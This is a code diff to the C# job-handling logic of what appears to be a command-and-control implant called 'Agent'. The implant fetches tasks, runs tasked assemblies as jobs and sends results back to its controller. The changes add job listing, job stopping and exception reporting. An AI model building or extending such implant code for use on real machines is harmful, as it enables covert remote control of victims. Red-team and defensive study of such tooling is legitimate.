@@ -55,17 +55,17 @@ namespace Agent
                 {
                     byte[] packets = null;
 
-                    foreach (string jobName in jobs.Keys)
-                    {
-                        string results = StopAgentJob(jobName);
-                        int jobResultID = resultIDs[jobName];
-                        packets = packets.Concat(EncodePacket(110, results, jobResultID)).ToArray();
-                        resultIDs.Remove(jobName);
-                    }
-                    if (packets != null)
-                    {
-                        SendMessage(packets);
-                    }
+                    //foreach (string jobName in jobs.Keys)
+                    //{
+                    //    string results = StopAgentJob(jobName);
+                    //    int jobResultID = resultIDs[jobName];
+                    //    packets = packets.Concat(EncodePacket(110, results, jobResultID)).ToArray();
+                    //    resultIDs.Remove(jobName);
+                    //}
+                    //if (packets != null)
+                    //{
+                    //    SendMessage(packets);
+                    //}
                 }
 
                 if (agentDeley != 0)
@@ -84,28 +84,28 @@ namespace Agent
                     Thread.Sleep(sleepTime * 1000);
                 }
 
-                byte[] jobResults = null;
-                foreach (string jobName in jobs.Keys)
-                {
-                    int jobResultID = resultIDs[jobName];
-                    string results = null;
-                    if (GetAgentJobCompleted(jobName))
-                    {
-                        results = StopAgentJob(jobName);
-                    }
-                    else
-                    {
-                        results = ReceiveAgentJob(jobName);
-                    }
-                    if (results.Length > 0)
-                    {
-                        jobResults = jobResults.Concat(EncodePacket(110, results, jobResultID)).ToArray();
-                    }
-                }
-                if (jobResults != null)
-                {
-                    SendMessage(jobResults);
-                }
+                //byte[] jobResults = null;
+                //foreach (string jobName in jobs.Keys)
+                //{
+                //    int jobResultID = resultIDs[jobName];
+                //    string results = null;
+                //    if (GetAgentJobCompleted(jobName))
+                //    {
+                //        results = StopAgentJob(jobName);
+                //    }
+                //    else
+                //    {
+                //        results = ReceiveAgentJob(jobName);
+                //    }
+                //    if (results.Length > 0)
+                //    {
+                //        jobResults = jobResults.Concat(EncodePacket(110, results, jobResultID)).ToArray();
+                //    }
+                //}
+                //if (jobResults != null)
+                //{
+                //    SendMessage(jobResults);
+                //}
 
                 byte[] taskData = GetTask();
                 if (taskData != null)
@@ -125,16 +125,30 @@ namespace Agent
             if (type == 100)
             {
                 StartAgentJob(type, msg, resultID);
-                return EncodePacket(type, $"{resultID}started", resultID);
+                return EncodePacket(type, $"task ID {resultID} started", resultID);
             }
             else if (type == 101)
             {
-                StartAgentJob(type, msg, resultID);
-                return EncodePacket(type, $"{resultID}started", resultID);
+                //SendMessage(EncodePacket(type, $"task ID {resultID} started", resultID));
+                //String result=StartAgentJob(type, msg, resultID);
+                return EncodePacket(type, $"task ID {resultID} started", resultID);
             }
-            else
+            else if (type == 50)
             {
-                return EncodePacket(type, "test", resultID);
+                String result = "";
+                foreach (string jobName in jobs.Keys)
+                {
+                    result += jobName + "\r\n";
+                }
+                return EncodePacket(type, $"Running Jobs:\r\n{result}", resultID);
+            }
+            else if (type == 51)
+            {
+                StopAgentJob(msg, resultID);
+                return EncodePacket(type, $"Jobs stopped", resultID);
+            }
+            else {
+                return EncodePacket(type, $"task ID {resultID} type invalid", resultID);
             }
         }
         private static void ProcessTaskingPackets(byte[] tasking)
@@ -257,13 +271,14 @@ namespace Agent
                         }
                         catch (Exception e)
                         {
-                            output += "Task Exception: " + e.Message + Environment.NewLine + e.StackTrace;
+                            String resultString = "Task Exception: " + e.Message + Environment.NewLine + e.StackTrace;
+                            SendMessage(EncodePacket(type, resultString, resultID));
                             return null;
                         }
 
                     });
-                    IAsyncResult result = exJob.BeginInvoke(pieces[0], parameters, ExecuteJobCallback, new string[] { type.ToString(), resultID.ToString(), saveFilePrefix, extention });
-                    //jobs.Add(Encoding.UTF8.GetString(jobName), result);
+                    IAsyncResult result = exJob.BeginInvoke(pieces[0], parameters, ExecuteJobCallback, new string[] { type.ToString(), resultID.ToString(), saveFilePrefix, extention, Encoding.UTF8.GetString(jobName) });
+                    jobs.Add(Encoding.UTF8.GetString(jobName), result);
                 }
             }
             catch (Exception e)
@@ -281,14 +296,18 @@ namespace Agent
             int resultID = int.Parse(((string[])iAsyncResult.AsyncState)[1]);
             string saveFilePrefix = ((string[])iAsyncResult.AsyncState)[2];
             string extention = ((string[])iAsyncResult.AsyncState)[3];
+            string jobName = ((string[])iAsyncResult.AsyncState)[4];
             string resultString = Convert.ToString(exJob.EndInvoke(iAsyncResult));
             byte[] resultPackets = EncodePacket(type, saveFilePrefix + extention + resultString, resultID);
             SendMessage(resultPackets);
+            jobs.Remove(jobName);
         }
 
         private delegate object ExecuteJob(string assamebly, object[] parameters);
-        private static string StopAgentJob(string jobName)
+        private static string StopAgentJob(string jobName,int resultID)
         {
+            
+            jobs.Remove(jobName);
             return null;
         }
         private static string ReceiveAgentJob(string jobName)
